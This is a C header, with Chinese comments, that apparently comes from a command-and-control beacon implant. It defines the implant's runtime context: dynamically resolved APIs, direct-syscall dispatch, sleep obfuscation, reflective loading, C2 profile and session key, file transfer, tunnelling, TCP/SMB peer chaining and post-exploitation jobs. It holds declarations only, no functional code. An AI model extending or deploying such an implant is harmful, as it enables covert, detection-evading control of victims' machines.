#pragma once

#include "beacon_crypto.h"
#include "beacon_outbox.h"
#include "beacon_profile.h"
#include "beacon_sysinfo.h"
#include "beacon_transfer.h"
#include "beacon_tunnel.h"
#include "beacon_cascade.h"
#include "beacon_api.h"
#include "beacon_syscall.h"
#include "beacon_jobs.h"
#include "beacon_runtime.h"
#include "beacon_postex.h"

/* Beacon 实例的运行时状态 */
typedef struct BeaconContext {
    Win32Api api;                  /* 动态解析的 API 函数指针 */
    SyscallManager syscall;        /* syscall 层：SSN 解析与调用方式分派 */
    Profile profile;               /* C2、sleep、传输等运行配置 */
    PVOID image_base;              /* DLL/EXE 映像基址，sleep/RDI 逻辑会使用 */
    MetaData meta;                 /* 主机、用户、进程等元数据 */
    UINT32 beacon_id;              /* 本地生成的信标 ID */
    BYTE8 session_key[BEACON_SESSION_KEY_SIZE]; /* 会话加密密钥 */
    INT active;                    /* 主循环运行标志 */
    RuntimeGate runtime;           /* worker 与 sleep 混淆之间的互斥门控 */
    Outbox outbox;                 /* 待上传结果队列 */
    JobManager jobs;               /* 后台 process/BOF job 管理器 */
    TransferManager transfers;     /* 文件上传/下载状态管理器 */
    TunnelManager tunnels;         /* 隧道通道状态管理器 */
    CascadeManager cascade;         /* TCP/SMB 级联子链路管理器 */
    PostExManager postex;           /* 外部 post-ex pipe job 管理器 */
} BeaconContext;

BOOL ContextInit(BeaconContext* ctx);
VOID ContextFree(BeaconContext* ctx);
